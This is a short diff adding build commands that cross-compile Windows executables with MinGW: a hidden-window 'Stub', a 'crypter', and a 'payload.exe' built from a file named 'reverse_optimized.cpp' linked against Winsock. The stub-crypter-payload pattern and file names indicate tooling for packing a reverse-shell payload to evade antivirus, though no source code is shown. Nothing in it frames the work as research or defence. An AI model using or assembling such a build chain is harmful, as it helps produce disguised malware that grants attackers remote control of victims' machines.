@@ -1,0 +1,6 @@
+# Stub — fully standalone
+x86_64-w64-mingw32-g++ -O2 -s -mwindows -std=c++17 Stub.cpp -ladvapi32 -static -o Stub.exe
+
+# Crypter — also make standalone (optional, but recommended)
+x86_64-w64-mingw32-g++ -O2 -s -std=c++17 crypter.cpp -ladvapi32 -static -o crypter.exe
+x86_64-w64-mingw32-g++ -O2 -s -static -mwindows -o payload.exe reverse_optimized.cpp -lws2_32
